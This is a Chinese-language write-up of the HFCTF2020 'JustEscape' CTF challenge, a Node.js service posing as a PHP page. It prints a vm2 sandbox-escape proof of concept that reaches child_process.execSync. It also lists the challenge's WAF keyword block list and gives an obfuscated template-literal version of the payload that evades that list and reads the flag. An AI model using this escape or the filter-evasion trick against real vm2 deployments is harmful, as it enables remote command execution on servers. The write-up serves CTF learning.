# [HFCTF2020]JustEscape

#PHP代码审计 #vm沙箱逃逸 #waf

进入网页，发现一些小Demo：

```
数学运算
code: (2+6-7)/3

run online: /run.php?code=(2%2b6-7)/3;

Ouput: 0.3333333333333333

注意编码 =.=
```

提示有/run.php，访问/run.php：

```php
<?php
if( array_key_exists( "code", $_GET ) && $_GET[ 'code' ] != NULL ) {
    $code = $_GET['code'];
    echo eval(code);
} else {
    highlight_file(__FILE__);
}
?>
```

尝试输入：

```
/run.php?code=2+2;
```

拦截请求并发送：

```
GET /run.php?code=2+2; HTTP/1.1
Host: 7ab9c4f8-545f-4aa1-9606-4d1abbc5a8b1.node4.buuoj.cn:81

```

响应为：

```
HTTP/1.1 200 OK
Server: openresty
Date: Mon, 15 Nov 2021 17:20:28 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 30
Connection: keep-alive
Etag: W/"1e-1+0L6+REwXcrCHBew/23ACAwURE"
X-Powered-By: Express

SyntaxError: Unexpected number
```

说明加号需要 url 编码才能进行正常的运算。

在Demo里，还有一个提示：

> 真的是 PHP 嘛

可能不是一个PHP站，所以题目中run.php可能是一个故意设置的路由，联想到eval()函数不仅仅是php含有的，javascript 也有这个函数，js测试的话可以用 Error().stack 直接查看报错信息。

输入url：

```
/run.php?code=Error().stack;
```

拦截并发送请求：

```
GET /run.php?code=Error().stack HTTP/1.1
Host: 7ab9c4f8-545f-4aa1-9606-4d1abbc5a8b1.node4.buuoj.cn:81

```

响应为：

```
HTTP/1.1 200 OK
Server: openresty
Date: Mon, 15 Nov 2021 17:26:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 624
Connection: keep-alive
Etag: W/"270-DDBqL2yCV4YxyUHSAtKO4Drqlt4"
X-Powered-By: Express

Error
    at vm.js:1:1
    at Script.runInContext (vm.js:131:20)
    at VM.run (/app/node_modules/vm2/lib/main.js:219:62)
    at /app/server.js:51:33
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)
```

根据这些报错，应该可以确认是vm沙箱逃逸。

```jsx
"use strict";
const {VM} = require('vm2');
const untrusted = '(' + function(){
    TypeError.prototype.get_process = f=>f.constructor("return process")();
    try{
        Object.preventExtensions(Buffer.from("")).a = 1;
    }catch(e){
        return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
    }
}+')()';
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

探测 waf 发现程序过滤了以下关键字：

```bash
['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '"',''']
```

js拼接字符串绕过waf改写payload显示网页根目录：

```jsx
/run.php?code=(function (){
TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
try{
    Object.preventExtensions(Buffer.from(``)).a = 1;
}catch(e){
    return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`ls /`).toString();
}
})()
```

直接复制到地址栏，空格自动转化为url编码，网页回显：

```bash
app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
```

修改payload输出flag：

```bash
/run.php?code=(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

得到flag。

References

[inanb](https://inanb.github.io/2021/08/22/HFCTF2020-JustEscape/)

[[BJDCTF2020]EasySearch HCTF-2018-Web-warmup](https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/)

[HFCTF2020 JustEscape](https://blog.z3ratu1.cn/%5BHFCTF2020%5DJustEscape.html)

Node.js 的常见漏洞：

[https://xz.aliyun.com/t/7184](https://xz.aliyun.com/t/7184)

POC：

[Breakout in v3.8.3 · Issue #225 · patriksimek/vm2](https://github.com/patriksimek/vm2/issues/225)